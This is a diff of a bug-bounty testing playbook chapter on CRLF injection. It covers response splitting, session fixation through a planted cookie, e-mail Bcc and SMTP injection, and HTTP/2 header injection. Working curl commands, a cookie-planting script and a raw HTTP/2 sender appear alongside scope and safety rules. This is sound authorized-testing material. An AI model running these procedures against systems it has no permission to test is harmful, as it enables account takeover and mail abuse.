@@ -50,13 +50,14 @@ survive into it as a line break?**
 The chapter gate (`http`) comes from the fingerprint. The items are gated by facts other probes settle:
 `redirect-param` and `params` (fingerprint, RDR probe), `url-fetch` (SSR probe), `cookie-auth` (AUT probe),
 `http2` and `reverse-proxy` (fingerprint). This chapter settles `email-out`, and records which component writes
-the redirects, which CRL-001 needs.
+the redirects (`$E/recon/$H/crl-writers.txt`), the writer CRL-001's Proof names.
 
 ```bash
 W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
 # 1. which component writes redirects and errors: compare Server and Via on the plain-HTTP redirect, a missing path and a malformed one
 for u in "http://$H/" "https://$H/crlprobe" "https://$H/%2e%2e%2fcrlprobe"; do
-  echo "== $u"; curl -sS --path-as-is "${HDR[@]}" -o /dev/null -D- --max-time 10 "$u" | grep -aiE '^(HTTP/|server:|via:|location:|x-cache|cf-ray|x-amz-cf)'; sleep "$W"; done
+  echo "== $u"; curl -sS --path-as-is "${HDR[@]}" -o /dev/null -D- --max-time 10 "$u" | grep -aiE '^(HTTP/|server:|via:|location:|x-cache|cf-ray|x-amz-cf)'; sleep "$W"
+done | tee "$E/recon/$H/crl-writers.txt"
 # 2. an HTTP/2 front end
 curl -sS "${HDR[@]}" --http2 -o /dev/null -w 'http_version=%{http_version}\n' "https://$H/"
 # 3. features that send mail built from our input, named in the crawl and the bundles
@@ -101,7 +102,7 @@ listener on our host).
 | **Unit** | host |
 | **Cost** | low |
 | **Weakness** | HTTP Response Splitting · CWE-113 |
-| **Prior art** | #197279, #66386, #25275, #409512 |
+| **Prior art** | #197279, #409512, #25275, #15492 |
 
 - **Where:** no asset fact gates this item beyond `http`: any host name can answer with a redirect built from the
   path, and the path needs no parameter. The writers are configured per host name: the plain-HTTP to HTTPS
@@ -144,20 +145,18 @@ listener on our host).
   showing `X-Crl001: probe` as a header line of its own; the same path without the line break as the control; the
   `Server` header naming the writer. Then the same link with `Set-Cookie:%20crl001=probe%3B%20Path=/` in place of
   the test header (`%3B`: servers that read a literal `;` as a path-parameter delimiter, Tomcat among them, strip
-  it), opened in Chrome or Firefox, with
-  `crl001=probe` in the browser's cookie storage (DevTools, or Playwright's `context.cookies()`): triagers accept a
-  split they can see in a browser, not one only curl shows.
+  it), opened in Chrome or Firefox, with `crl001=probe` in the browser's cookie storage (DevTools, or Playwright's
+  `context.cookies()`): triagers accept a split they can see in a browser, not one only curl shows.
 - **Not a finding when:** our text sits inside `Location` with the line break still encoded or replaced by a
   space: the writer escaped it. The split needs a bare CR or a folded line (CR LF followed by a space or tab) and
   the browser check in Proof stores no cookie: RFC 9112 makes a bare CR invalid and lets a recipient read it as a
   space, and a folded line continues the previous header (#145392 is titled as needing PHP header folding and
-  Internet Explorer 11). The split is only on
-  the port-80 redirect: current Chrome upgrades `http://` navigations to `https://` before sending them when the
-  host answers HTTPS, and an HSTS-preloaded domain never sends them, so show the link working in a browser before
-  claiming impact. The front end answers 502 to the split: it refused the origin's malformed response and no
-  browser sees it. A 400 page that echoes the raw request line prints it in the body, not in a header. The host
-  runs on a vendor's infrastructure (a hosted VPN or support portal): `third-party`, or the CVE chapter when it is a
-  known appliance bug.
+  Internet Explorer 11). The split is only on the port-80 redirect: current Chrome upgrades `http://` navigations
+  to `https://` before sending them when the host answers HTTPS, and an HSTS-preloaded domain never sends them, so
+  show the link working in a browser before claiming impact. The front end answers 502 to the split: it refused
+  the origin's malformed response and no browser sees it. A 400 page that echoes the raw request line prints it in
+  the body, not in a header. The host runs on a vendor's infrastructure (a hosted VPN or support portal):
+  `third-party`, or the CVE chapter when it is a known appliance bug.
 - **Escalate:** CRL-004 when the split response is one a browser renders; CRL-005 for any split, redirect or not.
   One configuration usually serves several host names: run the item on each and report them together as one root
   cause. A decoded path copied into `proxy_set_header` or `proxy_pass` puts the line break into the request the
@@ -428,16 +427,16 @@ listener on our host).
   copy is now signed in as B. It holds only when the application keeps the identifier across sign-in (or adopts one
   it never issued); when it rotates the identifier, the planted cookie is just a cookie.
 - **How:** `SC` is the session cookie's name and `PARENT` the domain the planted cookie is set for (the real
-  cookie's `Domain`, or else the application host's registrable domain); `APP` is the application's base URL;
-  `B_USER` and `B_PASS` are account B's credentials in the environment, never written to evidence.
+  cookie's `Domain`, or else the application host's registrable domain); `B_USER` and `B_PASS` are account B's
+  credentials in the environment, never written to evidence.
   ```bash
-  D="$E/evidence/$H/CRL-005"; mkdir -p "$D"; : "${SC:?name of the session cookie}" "${PARENT:?the cookie's Domain or the registrable domain}"
-  APP="$T"                                   # the application whose session is planted, when this card runs on a sibling's split
+  D="$E/evidence/$H/CRL-005"; mkdir -p "$D"; : "${SC:?name of the session cookie}" "${PARENT:?Domain of the session cookie, or the registrable domain}"
+  PARENT="${PARENT#.}"
   # the split: this host first, then the parent domain and its sub-domains (their cookies reach the application)
   HITS=( "$E/evidence/$H"/CRL-00[123]/hits.tsv "$E/evidence/$PARENT"/CRL-00[123]/hits.tsv "$E/evidence/"*".$PARENT"/CRL-00[123]/hits.tsv )
   IFS=$'\t' read -r _ _ L TPL _ < <(cat "${HITS[@]}" 2>/dev/null | head -1); echo "split: $TPL ($L)"
   # 1. a session identifier issued before sign-in: the attacker's copy, percent-encoded once because the server decodes our value
-  V=$(curl -sS "${HDR[@]}" -c - -o /dev/null "$APP/login" | awk -v n="$SC" '$6==n{v=$7} END{print v}'); echo "V=$V" | tee "$D/attacker.txt"
+  V=$(curl -sS "${HDR[@]}" -c - -o /dev/null "$T/login" | awk -v n="$SC" '$6==n{v=$7} END{print v}'); echo "V=$V" | tee "$D/attacker.txt"
   VE=$(python3 -c 'import sys, urllib.parse as u; print(u.quote(sys.argv[1], safe=""))' "$V")
   # 2. the planting link. Secure only on an https split: a plain-HTTP response cannot set it. A __Host- cookie takes
   #    no Domain and needs Secure and Path=/, so only the application's own host can plant it, over https
@@ -459,9 +458,9 @@ listener on our host).
     await p.waitForTimeout(5000); await jar('after B signed in'); await p.screenshot({ path: `${dir}/victim.png` }); await b.close();
   })();
   JS
-  NODE_PATH="$(npm root -g)" node "$D/fix.js" "$LINK" "$APP/login" "$SC" "$D" "${HDR[@]}"; cat "$D/victim-cookies.txt"
+  NODE_PATH="$(npm root -g)" node "$D/fix.js" "$LINK" "$T/login" "$SC" "$D" "${HDR[@]}"; cat "$D/victim-cookies.txt"
   # 3. the attacker's copy, which never signed in: whose account does it open? (the application's own profile call)
-  curl -sS "${HDR[@]}" -b "$SC=$V" -o "$D/attacker-me.json" -w 'attacker with V: %{http_code}\n' "$APP/api/me"; head -c 300 "$D/attacker-me.json"
+  curl -sS "${HDR[@]}" -b "$SC=$V" -o "$D/attacker-me.json" -w 'attacker with V: %{http_code}\n' "$T/api/me"; head -c 300 "$D/attacker-me.json"
   ```
   An application that issues no identifier before sign-in may still adopt one it never issued: set
   `V=crl005$(openssl rand -hex 16)`, recompute `VE`, and repeat steps 2 and 3.
@@ -577,19 +576,18 @@ listener on our host).
   e-mail, subject), invitations (the invitee's address, our display name, the message), share by e-mail, referral
   invitations, newsletter sign-up, appointment and calendar invitations (#1509216 and #1516377 are titled as SMTP
   command injection through appointment e-mails and their iCalendar attachments), and stored fields that later
-  appear in mail headers: the display
-  name, the organisation name (#3913012), the e-mail address itself (#815085 is titled as an e-mail address field
-  that accepted `%0d%0a`). A form with an anti-CSRF token needs the token copied from the form page; one with a
-  CAPTCHA is submitted from the browser, one variant at a time.
+  appear in mail headers: the display name, the organisation name (#3913012), the e-mail address itself (#815085
+  is titled as an e-mail address field that accepted `%0d%0a`). A form with an anti-CSRF token needs the token
+  copied from the form page; one with a CAPTCHA is submitted from the browser, one variant at a time.
 - **Test:** the mail code writes `To`, `From`, `Reply-To` and `Subject` as lines, and a hand-written SMTP client
   writes `MAIL FROM:` and `RCPT TO:` the same way. A line break in a header field adds a header. Whether an added
   `Bcc:` is delivered depends on the sender: `sendmail -t` (PHP's `mail()`) and libraries that read the recipients
   from the headers deliver it; libraries that keep their own recipient list only show it in the raw source. A line
   break in an address that reaches `MAIL FROM:` adds an SMTP command. Use two inboxes of ours: `M1`, which the form
   normally writes to or which we enter as the sender, and `M2`, never entered anywhere on the target (a
-  plus-address of our own mailbox is enough where the programme's alias rule allows it: `Delivered-To` shows which
-  address received the copy). Each submission produces at most one extra mail, to `M2`. Never end the DATA section (a line holding only `.`) or start
-  a second transaction.
+  plus-address of our own mailbox is enough where the programme's alias rule allows it: `Delivered-To` or
+  `X-Original-To` shows which address received the copy). Each submission produces at most one extra mail, to
+  `M2`. Never end the DATA section (a line holding only `.`) or start a second transaction.
 - **How:** the field names come from the form's real request; put the line break in one field per request.
   ```bash
   D="$E/evidence/$H/CRL-007"; mkdir -p "$D"; : "${M1:?our inbox}" "${M2:?our second inbox, never entered on the target}"
@@ -630,7 +628,7 @@ listener on our host).
 | **Requires** | http2, reverse-proxy |
 | **Excluded by** | — |
 | **Unit** | host |
-| **Cost** | medium |
+| **Cost** | low |
 | **Weakness** | CRLF Injection · CWE-93 |
 | **Prior art** | #1391549, #1211724, #1575912 |
 
@@ -649,7 +647,7 @@ listener on our host).
   as given.
   ```bash
   D="$E/evidence/$H/CRL-008"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
-  python3 -c 'import h2' 2>/dev/null || pip install --user h2
+  python3 -c 'import h2' 2>/dev/null || python3 -m pip install --user h2
   cat > "$D/h2crlf.py" <<'PY'
   # h2crlf.py <host> <path> <header name> <header value> [-- the HDR arguments]; \r and \n in path, name and value are sent as CR and LF
   import socket, ssl, sys
@@ -708,10 +706,10 @@ listener on our host).
   test. The application server terminates HTTP/2 itself (no `via`, the same `server` on every error class): there is
   no downgrade, and a 400 is that server parsing its own input.
 - **Escalate:** the SMG chapter: the same line break carrying `transfer-encoding: chunked` is HTTP/2 request
-  smuggling (#1211724 is titled as request smuggling via HTTP/2; #1575912 as smuggling through newlines in a header
-  value a CDN writes upstream); prove it on our own requests under that chapter's rules. The HHI chapter when an
-  injected `Host` line reaches another virtual host behind the front end. The CCH chapter when a cacheable response
-  changes with the injected line.
+  smuggling (#1211724 is titled as request smuggling via HTTP/2; #1575912 as smuggling through newlines in the
+  `host_header` value of a CDN's Origin Rules, which the CDN writes upstream); prove it on our own requests under
+  that chapter's rules. The HHI chapter when an injected `Host` line reaches another virtual host behind the front
+  end. The CCH chapter when a cacheable response changes with the injected line.
 
 ## Graveyard
 
@@ -722,26 +720,30 @@ listener on our host).
   that the victim's browser cannot be made to send: self-only (#798686). The Host-header titles filed under this
   class (ten reports, one paid $100, #13286) are `host-header` without demonstrated impact and belong to the HHI
   chapter. A shared cache that stores the response makes it a CCH finding.
-- **A split no current browser honours.** A bare CR, a folded line (CR LF followed by a space or tab), or a quirk of
-  Internet Explorer (#197279's summary, #145392's title). Triagers reproduce in current Chrome and Firefox.
+- **A split only curl shows.** A bare CR, a folded line (CR LF followed by a space or tab), or a quirk of Internet
+  Explorer (#197279's summary, #145392's title) that the browser check does not reproduce. Triagers reproduce in
+  current Chrome and Firefox.
 - **A split only on a plain-HTTP redirect.** Current Chrome upgrades `http://` navigations to `https://` before
   sending them, and HSTS preload removes the request entirely; without a browser demonstration it is closed as
   theoretical.
-- **Cookie bombing.** Planting many large cookies so that every request to the site is refused is denial of service
-  (`dos`); #583819 and #861521 are titled as cookie injection used that way. Do not run it.
+- **Cookie bombing.** Planting many large cookies so that the site refuses every request from the victim's browser
+  is denial of service, closed under `dos` by most policies. #583819 (paid $560) and #861521 are titled as cookie
+  injection used that way. Without `dos-ok`, name the consequence in the report of the split and do not run it.
 - **Text in a split body without script.** Content spoofing (`content-spoofing`).
 - **Log injection.** A line break in a value written to a log file forges a log line. Programmes close it as
-  informative: nobody outside reads the log, and a forged line misleads only a person reading raw text. The class's
-  log-injection titles (#963816, #1135875) are GitHub Security Lab CodeQL query submissions, not findings on a
-  deployed target. A log viewer that renders entries as HTML is stored XSS in the staff interface (XSS chapter). No
-  exclusion tag covers it.
+  informative: nobody outside reads the log, and a forged line misleads only a person reading raw text. Of the
+  class's five log-injection titles, four are GitHub Security Lab query submissions (#963816, #1135875, #1135876,
+  #1368721) and one is in the Monero daemon's RPC (#3621606); none is on a deployed web target and none was paid. A
+  log viewer that renders entries as HTML is stored XSS in the staff interface (XSS chapter). No exclusion tag
+  covers it.
 - **Mail without an added recipient.** HTML or a link in the body of a contact-form mail (`content-spoofing`;
   #3802451 is rated medium and was not paid), "send me a copy" to an address we typed (the feature), missing SPF,
   DKIM or DMARC records (`spf-dmarc`).
-- **Library and client bugs.** CRLF in urllib, undici, Netty and Apache httpd was paid upstream by the Internet Bug
-  Bounty and GitHub Security Lab (six reports, $8,000 together); Shopify paid $800 for its own pitchfork server
-  (#2279572). On a target these are the CVE chapter's, and `known-cve` inside the patch window. None of the 33 curl
-  reports filed under the class was paid: they concern options the calling program sets.
+- **Library and client bugs.** CRLF in urllib, undici, Netty and Apache httpd (five reports) and one query
+  submission for header injection (#1401159) were paid upstream by the Internet Bug Bounty and GitHub Security Lab,
+  $8,000 together; Shopify paid $800 for its own pitchfork server (#2279572). On a target these are the CVE
+  chapter's, and `known-cve` inside the patch window. None of the 33 curl reports filed under the class was paid:
+  most concern values the calling program passes to libcurl.
 - **Duplicates.** The path split on a programme's main host is in every scanner's template set; on a long-running
   programme expect `dup-risk`. New and secondary hosts (VPN portals, regional sites) are where the class still pays.
 
